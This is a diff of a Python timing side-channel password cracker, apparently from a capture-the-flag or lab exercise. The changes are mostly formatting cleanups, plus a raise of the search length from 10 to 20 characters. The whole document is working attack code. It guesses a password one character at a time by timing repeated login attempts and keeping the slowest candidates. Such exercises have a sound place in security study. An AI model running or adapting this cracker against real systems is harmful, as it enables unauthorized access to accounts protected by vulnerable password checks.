@@ -1,4 +1,5 @@
 # pylint: disable=global-statement,invalid-name,wildcard-import,unused-wildcard-import,pointless-string-statement
+import sys
 import subprocess
 from collections import defaultdict
 from utils import *
@@ -43,10 +44,10 @@ def try_passwords(plist):
 
 def try_passwords_ntimes(prefix, ntimes=10, best_timings=None, full_data=None, pwds=None):
     if pwds is None:
-        chrs = sorted(printable_no_ws | {" "} )
+        chrs = sorted(printable_no_ws | {" "})
         pwds = [prefix+c for c in chrs]
     if best_timings is None:
-        best_timings = {pw:0xffffffffffffffffffffffffffffff  for pw in pwds}
+        best_timings = {pw: 0xffffffffffffffffffffffffffffff for pw in pwds}
     if full_data is None:
         full_data = defaultdict(list)
 
@@ -64,16 +65,16 @@ def try_passwords_ntimes(prefix, ntimes=10, best_timings=None, full_data=None, p
 
 def crack_password(prefix, ntimes=10):
     pw = prefix
-    while len(pw) < 10:
+    while len(pw) < 20:
         try:
-            best_timings, full_data = None,None
-            chrs = sorted(printable_no_ws | {" "} )
+            best_timings, full_data = None, None
+            chrs = sorted(printable_no_ws | {" "})
             pwds = [pw+c for c in chrs]
             for i in range(ntimes):
-                best_timings, full_data = try_passwords_ntimes(pw, ntimes=1,best_timings=best_timings, full_data=full_data,pwds=pwds)
+                best_timings, full_data = try_passwords_ntimes(pw, ntimes=1, best_timings=best_timings, full_data=full_data, pwds=pwds)
                 timingsSrt = sorted(best_timings.items(), key=lambda kv: kv[1])
                 threshold = timingsSrt[0][1] + (timingsSrt[-1][1] - timingsSrt[0][1])/5
-                pwds = [k for k,v in best_timings.items() if v>threshold]
+                pwds = [k for k, v in best_timings.items() if v > threshold]
 
         except SuccessfulPasswordException as e:
             return e.args[1]
@@ -101,9 +102,8 @@ def crack_password(prefix, ntimes=10):
                             snd_slowest_pw, snd_slowest_t, fastest_pw, fastest_t, rng, best_dif)
 
 
-import sys
-if __name__=="__main__":
-    p="sepi"
-    if len(sys.argv)>1:
-        p=sys.argv[1]
-    crack_password(p,7)
+if __name__ == "__main__":
+    p = "sepi"
+    if len(sys.argv) > 1:
+        p = sys.argv[1]
+    crack_password(p, 7)
